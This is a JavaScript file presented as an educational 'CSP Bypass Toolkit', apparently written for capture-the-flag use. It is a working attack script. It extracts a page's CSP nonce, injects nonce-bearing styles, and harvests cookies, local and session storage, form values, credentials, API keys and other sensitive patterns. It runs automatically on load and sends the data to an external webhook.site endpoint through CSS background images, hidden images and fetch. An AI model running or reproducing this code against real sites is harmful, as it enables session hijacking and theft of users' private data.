// CSP Bypass Toolkit - Nonce Extraction, Style Injection, and Data Exfiltration
// Author: Security Research Tool
// Purpose: Educational/Research CSP bypass techniques

console.log('🔥 CSP Bypass Toolkit Loaded');

// ===================================
// 1. NONCE EXTRACTION MODULE
// ===================================

const NonceExtractor = {
    extract() {
        console.log('🔍 [NONCE] Starting nonce extraction...');
        
        // Method 1: DOM-based extraction
        const domNonce = this.extractFromDOM();
        if (domNonce) return domNonce;
        
        // Method 2: Source code regex extraction
        const regexNonce = this.extractFromSource();
        if (regexNonce) return regexNonce;
        
        // Method 3: CSP header parsing
        const cspNonce = this.extractFromCSP();
        if (cspNonce) return cspNonce;
        
        console.log('❌ [NONCE] No nonce found');
        return null;
    },
    
    extractFromDOM() {
        const selectors = [
            'style[nonce]', 'script[nonce]', 'link[nonce]', 
            '[nonce]', 'meta[nonce]'
        ];
        
        for (const selector of selectors) {
            const elements = document.querySelectorAll(selector);
            for (const element of elements) {
                const nonce = element.nonce || element.getAttribute('nonce');
                if (nonce) {
                    console.log('✅ [NONCE] Found via DOM:', { selector, nonce });
                    return nonce;
                }
            }
        }
        return null;
    },
    
    extractFromSource() {
        const html = document.documentElement.outerHTML;
        const patterns = [
            /nonce=["']([^"']+)["']/gi,
            /nonce:\s*["']([^"']+)["']/gi,
            /'nonce-([^']+)'/gi,
            /"nonce-([^"]+)"/gi
        ];
        
        for (const pattern of patterns) {
            const match = pattern.exec(html);
            if (match) {
                console.log('✅ [NONCE] Found via regex:', match[1]);
                return match[1];
            }
        }
        return null;
    },
    
    extractFromCSP() {
        const metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
        for (const meta of metas) {
            const content = meta.getAttribute('content');
            const nonceMatch = content.match(/'nonce-([^']+)'/);
            if (nonceMatch) {
                console.log('✅ [NONCE] Found in CSP meta:', nonceMatch[1]);
                return nonceMatch[1];
            }
        }
        return null;
    }
};

// ===================================
// 2. STYLE INJECTION MODULE
// ===================================

const StyleInjector = {
    inject(nonce, type = 'basic') {
        console.log(`🎨 [INJECT] Injecting ${type} styles with nonce:`, nonce);
        
        switch (type) {
            case 'basic':
                return this.injectBasic(nonce);
            case 'vomp':
                return this.injectVomp(nonce);
            case 'exfill':
                return this.injectExfill(nonce);
            case 'hunter':
                return this.injectHunter(nonce);
            default:
                return this.injectBasic(nonce);
        }
    },
    
    injectBasic(nonce) {
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            /* Basic CSP Bypass Indicator */
            body::before {
                content: 'CSP BYPASS ACTIVE ✅';
                position: fixed;
                top: 10px;
                right: 10px;
                background: #28a745;
                color: white;
                padding: 10px;
                border-radius: 5px;
                z-index: 999999;
                font-family: monospace;
                font-size: 14px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            }
        `;
        document.head.appendChild(style);
        console.log('✅ [INJECT] Basic style injected');
        return true;
    },
    
    injectVomp(nonce) {
        // VOMP: Visual Overlay Message Payload
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            /* VOMP - Visual Overlay Message Payload */
            .vomp-overlay {
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                width: 100vw !important;
                height: 100vh !important;
                background: rgba(255, 0, 0, 0.8) !important;
                color: white !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                z-index: 999999 !important;
                font-size: 48px !important;
                font-family: Arial !important;
                text-align: center !important;
                animation: pulse 2s infinite !important;
            }
            
            @keyframes pulse {
                0%, 100% { opacity: 0.8; }
                50% { opacity: 1; }
            }
            
            .vomp-close {
                position: absolute !important;
                top: 20px !important;
                right: 20px !important;
                font-size: 24px !important;
                cursor: pointer !important;
                background: black !important;
                padding: 10px !important;
                border-radius: 50% !important;
            }
        `;
        document.head.appendChild(style);
        
        // Create overlay element
        const overlay = document.createElement('div');
        overlay.className = 'vomp-overlay';
        overlay.innerHTML = `
            <div>
                🚨 CSP BYPASS SUCCESSFUL 🚨<br>
                <div style="font-size: 24px; margin-top: 20px;">
                    Site security compromised via nonce injection
                </div>
                <div class="vomp-close" onclick="this.parentElement.remove()">✖</div>
            </div>
        `;
        document.body.appendChild(overlay);
        
        console.log('✅ [INJECT] VOMP overlay injected');
        return true;
    },
    
    injectExfill(nonce) {
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            /* Exfiltration Data Collection Styles */
            .exfill-indicator {
                position: fixed;
                bottom: 10px;
                left: 10px;
                background: #dc3545;
                color: white;
                padding: 8px;
                border-radius: 3px;
                z-index: 999999;
                font-family: monospace;
                font-size: 12px;
                animation: blink 1s infinite;
            }
            
            @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0.3; }
            }
            
            /* Hide sensitive inputs visually while keeping them functional */
            input[type="password"]:focus,
            input[name*="pass"]:focus,
            input[name*="secret"]:focus {
                background: #ffe6e6 !important;
                border: 2px solid red !important;
            }
        `;
        document.head.appendChild(style);
        
        // Add exfiltration indicator
        const indicator = document.createElement('div');
        indicator.className = 'exfill-indicator';
        indicator.textContent = '📡 DATA COLLECTION ACTIVE';
        document.body.appendChild(indicator);
        
        console.log('✅ [INJECT] Exfiltration styles injected');
        return true;
    },
    
    injectHunter(nonce) {
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            /* Hunter Mode - Highlight sensitive data */
            
            /* Highlight forms */
            form {
                outline: 2px dashed #ff6b6b !important;
                background: rgba(255, 107, 107, 0.1) !important;
            }
            
            /* Highlight password fields */
            input[type="password"],
            input[name*="pass"],
            input[name*="pwd"] {
                outline: 3px solid #e74c3c !important;
                background: rgba(231, 76, 60, 0.2) !important;
            }
            
            /* Highlight sensitive inputs */
            input[name*="secret"],
            input[name*="token"],
            input[name*="key"],
            input[name*="api"] {
                outline: 3px solid #f39c12 !important;
                background: rgba(243, 156, 18, 0.2) !important;
            }
            
            /* Highlight links */
            a[href*="admin"],
            a[href*="login"],
            a[href*="api"],
            a[href*="secret"] {
                background: yellow !important;
                color: black !important;
                font-weight: bold !important;
            }
            
            /* Add hunter status */
            body::after {
                content: '🎯 HUNTER MODE ACTIVE - Sensitive data highlighted';
                position: fixed;
                top: 50%;
                left: 10px;
                transform: translateY(-50%);
                background: #8e44ad;
                color: white;
                padding: 10px;
                border-radius: 5px;
                z-index: 999999;
                font-family: monospace;
                font-size: 12px;
                writing-mode: vertical-lr;
            }
        `;
        document.head.appendChild(style);
        
        console.log('✅ [INJECT] Hunter mode styles injected');
        return true;
    }
};

// ===================================
// 3. DATA EXFILTRATION MODULE
// ===================================

const DataExfiltrator = {
    collect() {
        console.log('📡 [EXFILL] Starting data collection...');
        
        const data = {
            url: location.href,
            domain: location.hostname,
            cookies: document.cookie,
            localStorage: this.getLocalStorage(),
            sessionStorage: this.getSessionStorage(),
            forms: this.getForms(),
            inputs: this.getInputs(),
            links: this.getLinks(),
            scripts: this.getScripts(),
            meta: this.getMetaTags(),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        console.log('📊 [EXFILL] Data collected:', data);
        return data;
    },
    
    getLocalStorage() {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        return storage;
    },
    
    getSessionStorage() {
        const storage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storage[key] = sessionStorage.getItem(key);
        }
        return storage;
    },
    
    getForms() {
        return Array.from(document.forms).map(form => ({
            action: form.action,
            method: form.method,
            inputs: Array.from(form.elements).map(el => ({
                name: el.name,
                type: el.type,
                value: el.type === 'password' ? '[REDACTED]' : el.value
            }))
        }));
    },
    
    getInputs() {
        return Array.from(document.querySelectorAll('input')).map(input => ({
            name: input.name,
            type: input.type,
            placeholder: input.placeholder,
            value: input.type === 'password' ? '[REDACTED]' : input.value
        }));
    },
    
    getLinks() {
        return Array.from(document.links).map(link => ({
            href: link.href,
            text: link.textContent.trim().substring(0, 50)
        })).filter(link => link.href);
    },
    
    getScripts() {
        return Array.from(document.scripts).map(script => ({
            src: script.src,
            type: script.type,
            hasNonce: !!script.nonce
        }));
    },
    
    getMetaTags() {
        return Array.from(document.querySelectorAll('meta')).map(meta => ({
            name: meta.name,
            property: meta.property,
            content: meta.content
        }));
    },
    
    exfiltrate(data, method = 'console') {
        console.log('🚀 [EXFILL] Exfiltrating data via:', method);
        
        switch (method) {
            case 'console':
                this.exfiltrateConsole(data);
                break;
            case 'css':
                this.exfiltrateCSS(data);
                break;
            case 'image':
                this.exfiltrateImage(data);
                break;
            case 'fetch':
                this.exfiltrateFetch(data);
                break;
        }
    },
    
    exfiltrateConsole(data) {
        console.log('📤 [EXFILL] Console exfiltration:');
        console.log('🔗 Base64 encoded:', btoa(JSON.stringify(data)));
        console.table(data);
    },
    
    exfiltrateCSS(data) {
        // CSS-based exfiltration using background images
        const encoded = btoa(JSON.stringify(data));
        const style = document.createElement('style');
        style.textContent = `
            body { 
                background-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}'); 
            }
        `;
        document.head.appendChild(style);
        console.log('🎨 [EXFILL] CSS exfiltration attempted');
    },
    
    exfiltrateImage(data) {
        const encoded = btoa(JSON.stringify(data));
        const img = document.createElement('img');
        img.src = `https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}`;
        img.style.display = 'none';
        document.body.appendChild(img);
        console.log('🖼️ [EXFILL] Image exfiltration attempted');
    },
    
    exfiltrateFetch(data) {
        // Note: This would likely be blocked by CSP
        try {
            fetch('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497', {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' }
            }).then(() => {
                console.log('🌐 [EXFILL] Fetch exfiltration successful');
            }).catch(err => {
                console.log('❌ [EXFILL] Fetch blocked by CSP:', err);
            });
        } catch (err) {
            console.log('❌ [EXFILL] Fetch error:', err);
        }
    }
};

// ===================================
// 4. HUNTER MODULE
// ===================================

const Hunter = {
    hunt() {
        console.log('🎯 [HUNTER] Starting hunt for sensitive data...');
        
        const findings = {
            flags: this.findFlags(),
            credentials: this.findCredentials(),
            apiKeys: this.findApiKeys(),
            secrets: this.findSecrets(),
            adminPaths: this.findAdminPaths(),
            vulnInputs: this.findVulnerableInputs(),
            sensitiveData: this.findSensitiveData()
        };
        
        console.log('🏆 [HUNTER] Hunt results:', findings);
        return findings;
    },
    
    findCredentials() {
        const patterns = [
            /password\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /pwd\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /pass\s*[:=]\s*['"]([^'"]+)['"]/gi
        ];
        
        return this.searchPatterns(patterns, 'credentials');
    },
    
    findApiKeys() {
        const patterns = [
            /api[_-]?key\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /apikey\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /api[_-]?secret\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /bearer\s+([a-zA-Z0-9\-_]+)/gi
        ];
        
        return this.searchPatterns(patterns, 'api_keys');
    },
    
    findSecrets() {
        const patterns = [
            /secret\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /token\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /key\s*[:=]\s*['"]([^'"]+)['"]/gi
        ];
        
        return this.searchPatterns(patterns, 'secrets');
    },
    
    findAdminPaths() {
        const adminSelectors = [
            'a[href*="admin"]',
            'a[href*="/admin"]',
            'a[href*="dashboard"]',
            'a[href*="manage"]',
            'a[href*="control"]'
        ];
        
        const adminLinks = [];
        adminSelectors.forEach(selector => {
            document.querySelectorAll(selector).forEach(link => {
                adminLinks.push({
                    url: link.href,
                    text: link.textContent.trim()
                });
            });
        });
        
        return adminLinks;
    },
    
    findVulnerableInputs() {
        const vulnInputs = [];
        document.querySelectorAll('input').forEach(input => {
            if (this.isVulnerableInput(input)) {
                vulnInputs.push({
                    name: input.name,
                    type: input.type,
                    placeholder: input.placeholder,
                    vulnerability: this.getVulnerabilityType(input)
                });
            }
        });
        
        return vulnInputs;
    },
    
    isVulnerableInput(input) {
        const vulnPatterns = [
            /pass/i, /secret/i, /token/i, /key/i, /api/i, /admin/i
        ];
        
        const checkString = `${input.name} ${input.placeholder} ${input.className}`;
        return vulnPatterns.some(pattern => pattern.test(checkString));
    },
    
    getVulnerabilityType(input) {
        if (/pass/i.test(input.name + input.placeholder)) return 'password';
        if (/secret/i.test(input.name + input.placeholder)) return 'secret';
        if (/token/i.test(input.name + input.placeholder)) return 'token';
        if (/api/i.test(input.name + input.placeholder)) return 'api_key';
        return 'sensitive';
    },
    
    findSensitiveData() {
        const sensitiveData = [];
        const textContent = document.body.textContent;
        
        const patterns = [
            { name: 'emails', pattern: /[\w\.-]+@[\w\.-]+\.\w+/gi },
            { name: 'phones', pattern: /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/gi },
            { name: 'ssns', pattern: /\d{3}-\d{2}-\d{4}/gi },
            { name: 'credit_cards', pattern: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/gi },
            { name: 'flags', pattern: /flag\{[^}]+\}/gi },
            { name: 'ctf_flags', pattern: /[A-Za-z0-9_]+\{[^}]+\}/gi }
        ];
        
        patterns.forEach(({ name, pattern }) => {
            const matches = textContent.match(pattern);
            if (matches) {
                sensitiveData.push({ type: name, data: matches });
            }
        });
        
        return sensitiveData;
    },

    findFlags() {
        console.log('🚩 [HUNTER] Searching for CTF flags...');
        const flags = [];
        
        // Search for flag files in links
        const flagLinks = [];
        document.querySelectorAll('a').forEach(link => {
            const href = link.href.toLowerCase();
            const text = link.textContent.toLowerCase();
            if (href.includes('flag') || text.includes('flag') || 
                href.includes('flag.txt') || text.includes('flag.txt')) {
                flagLinks.push({
                    url: link.href,
                    text: link.textContent.trim()
                });
            }
        });
        
        // Search for flag patterns in text content
        const textContent = document.body.textContent;
        const flagPatterns = [
            /flag\{[^}]+\}/gi,
            /[A-Za-z0-9_]+\{[^}]+\}/gi,
            /CTF\{[^}]+\}/gi,
            /FLAG\{[^}]+\}/gi
        ];
        
        const flagMatches = [];
        flagPatterns.forEach(pattern => {
            const matches = textContent.match(pattern);
            if (matches) {
                flagMatches.push(...matches);
            }
        });
        
        // Search for flag-related input fields
        const flagInputs = [];
        document.querySelectorAll('input').forEach(input => {
            const name = (input.name || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            
            if (name.includes('flag') || placeholder.includes('flag') || id.includes('flag')) {
                flagInputs.push({
                    name: input.name,
                    type: input.type,
                    placeholder: input.placeholder,
                    value: input.value
                });
            }
        });
        
        return {
            flagLinks,
            flagMatches,
            flagInputs
        };
    },
    
    searchPatterns(patterns, type) {
        const results = [];
        const searchText = document.documentElement.outerHTML;
        
        patterns.forEach(pattern => {
            let match;
            while ((match = pattern.exec(searchText)) !== null) {
                results.push({
                    type: type,
                    value: match[1] || match[0],
                    context: match.input.substr(Math.max(0, match.index - 20), 40)
                });
            }
        });
        
        return results;
    }
};

// ===================================
// 5. MAIN EXECUTION
// ===================================

const CSPBypass = {
    run(mode = 'all') {
        console.log('🚀 [MAIN] Starting CSP Bypass Toolkit...');
        
        // Extract nonce
        const nonce = NonceExtractor.extract();
        if (!nonce) {
            console.log('❌ [MAIN] No nonce found - CSP bypass not possible');
            return false;
        }
        
        console.log('✅ [MAIN] Nonce extracted:', nonce);
        
        // Execute based on mode
        switch (mode) {
            case 'basic':
                StyleInjector.inject(nonce, 'basic');
                break;
                
            case 'vomp':
                StyleInjector.inject(nonce, 'vomp');
                break;
                
            case 'exfill':
                StyleInjector.inject(nonce, 'exfill');
                const data = DataExfiltrator.collect();
                DataExfiltrator.exfiltrate(data, 'console');
                break;
                
            case 'hunter':
                StyleInjector.inject(nonce, 'hunter');
                const findings = Hunter.hunt();
                console.log('🎯 [MAIN] Hunt complete:', findings);
                break;
                
            case 'flag':
                console.log('🚩 [MAIN] Running flag hunting mode...');
                StyleInjector.inject(nonce, 'hunter');
                const flags = Hunter.findFlags();
                const flagData = {
                    url: location.href,
                    domain: location.hostname,
                    flags: flags,
                    timestamp: new Date().toISOString()
                };
                console.log('🚩 [MAIN] Flags found:', flags);
                DataExfiltrator.exfiltrate(flagData, 'fetch');
                DataExfiltrator.exfiltrate(flagData, 'image');
                DataExfiltrator.exfiltrate(flagData, 'console');
                break;
                
            case 'all':
            default:
                console.log('🔥 [MAIN] Running full bypass suite...');
                StyleInjector.inject(nonce, 'basic');
                StyleInjector.inject(nonce, 'hunter');
                const fullData = DataExfiltrator.collect();
                const huntResults = Hunter.hunt();
                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console');
                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'fetch');
                break;
        }
        
        console.log('✅ [MAIN] CSP Bypass execution complete');
        return true;
    }
};

// ===================================
// 6. AUTO-EXECUTION
// ===================================

// Auto-run on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => CSPBypass.run());
} else {
    CSPBypass.run();
}

// Expose global functions for manual execution
window.CSPBypass = CSPBypass;
window.runBasic = () => CSPBypass.run('basic');
window.runVomp = () => CSPBypass.run('vomp');
window.runExfill = () => CSPBypass.run('exfill');
window.runHunter = () => CSPBypass.run('hunter');
window.runFlag = () => CSPBypass.run('flag');

console.log('🔥 CSP Bypass Toolkit Ready - Use CSPBypass.run() or window.runBasic/runVomp/runExfill/runHunter/runFlag()'); 